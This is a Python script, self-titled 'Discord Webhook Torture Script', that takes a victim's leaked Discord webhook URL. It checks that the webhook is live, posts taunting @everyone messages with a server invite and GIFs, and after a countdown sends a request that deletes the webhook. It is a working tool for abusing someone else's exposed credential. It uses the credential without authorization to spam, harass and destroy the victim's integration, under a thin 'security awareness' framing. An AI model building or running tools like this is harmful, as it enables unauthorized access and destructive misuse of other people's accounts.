import os
import sys
import time
import requests

NORMAL_MESSAGE = """@everyone 
```Hello, I have ran a bot on GitHub and I have found this webhook, delete this webhook and make a new one and when putting your webhook in coding, make sure to private the repository or obfuscate the coding. If this webhook isn’t deleted, I will delete it myself in about 10 minutes.

If your webhook was leaked and you are reading this, join``` https://discord.gg/duQJPVKDDY.
https://cdn.discordapp.com/attachments/1562439973825941545/1566799324346851388/togif-4.gif?ex=6aefc9d4&is=6aee7854&hm=97d3e4987479fde13f05179fac78262cc3a9da825b38c1d001abd0cb07812dcb&"""

SELF_DESTRUCT_MESSAGE = """@everyone 
```Your Webhook has been leaked and I will give you 3 minutes to delete your webhook yourself or it will self destruct in 3 minutes, if it’s not deleted yourself in 3 minutes, it will self destruct. Yes I am that cruel, and I will keep doing this if it’s not deleted.```"""
AUTO_DELETE_WARNING_MESSAGE = """@everyone 
```your webhook self destructed, make a new webhook and make sure to private your coding and don't paste your webhook in untrusted places.```
https://klipy.com/gifs/chopper-one"""
AUTO_DELETE_SECONDS = int(os.getenv("WEBHOOK_TORTURE_SELF_DESTRUCT_SECONDS", "180"))


def ask_user(prompt):
    while True:
        answer = input(prompt).strip()
        if answer.lower() == "close":
            print("Exiting...")
            raise SystemExit
        return answer


def ask_yes_no(prompt):
    while True:
        answer = ask_user(prompt)
        normalized = answer.lower()
        if normalized in {"yes", "y", "no", "n"}:
            return normalized in {"yes", "y"}
        print("Please answer with yes or no.")


def check_webhook(url):
    try:
        response = requests.get(url, timeout=10)
    except requests.RequestException as exc:
        print(f"Webhook check failed: {exc}")
        return False, None

    if response.status_code == 200:
        try:
            data = response.json()
            name = data.get("name") or "Unknown webhook"
            return True, name
        except ValueError:
            return True, "Unknown webhook"

    print("webhook was deleted, geeg")
    return False, None


def post_message(url, content):
    try:
        response = requests.post(url, json={"content": content}, timeout=10)
    except requests.RequestException as exc:
        print(f"Request error: {exc}")
        return False

    if response.status_code in {200, 201, 204}:
        print("Message posted successfully.")
        return True

    print(f"Failed to post message: {response.status_code} - {response.text[:200]}")
    return False


def delete_webhook(url):
    try:
        response = requests.delete(url, timeout=10)
    except requests.RequestException as exc:
        print(f"Delete request failed: {exc}")
        return False

    if response.status_code in {200, 202, 204}:
        print("Webhook deleted successfully.")
        return True

    if response.status_code in {404, 410}:
        print("webhook was deleted, geeg")
        return False

    print(f"Delete failed: {response.status_code} - {response.text[:200]}")
    return False


def main():
    print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
    print("$$                                      $$")
    print("$$   Discord Webhook Torture Script     $$")
    print("$$                                      $$")
    print("$$ Type 'close' at any prompt to stop.  $$")
    print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")

    webhook_url = ask_user("paste victims webhook here - ")
    if not webhook_url:
        print("No webhook was provided.")
        return

    valid, webhook_name = check_webhook(webhook_url)
    if not valid:
        print("The webhook is unavailable. Exiting.")
        return

    print(f"Webhook found: {webhook_name}")

    send_normal = ask_yes_no("wanna send the message? (yes/no): ")
    if send_normal:
        post_message(webhook_url, NORMAL_MESSAGE)

    send_self_destruct = ask_yes_no("wanna send self destruction message? (yes/no): ")
    if send_self_destruct:
        post_message(webhook_url, SELF_DESTRUCT_MESSAGE)

    seconds = AUTO_DELETE_SECONDS
    if seconds <= 0:
        seconds = 0

    print(f"Webhook auto-delete timer started for {seconds} seconds.")
    for remaining in range(seconds, 0, -1):
        if remaining <= 5:
            print(f"Auto-deleting in {remaining} seconds...")
            if remaining == 5:
                post_message(webhook_url, AUTO_DELETE_WARNING_MESSAGE)
        time.sleep(1)

    delete_webhook(webhook_url)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        sys.exit(0)
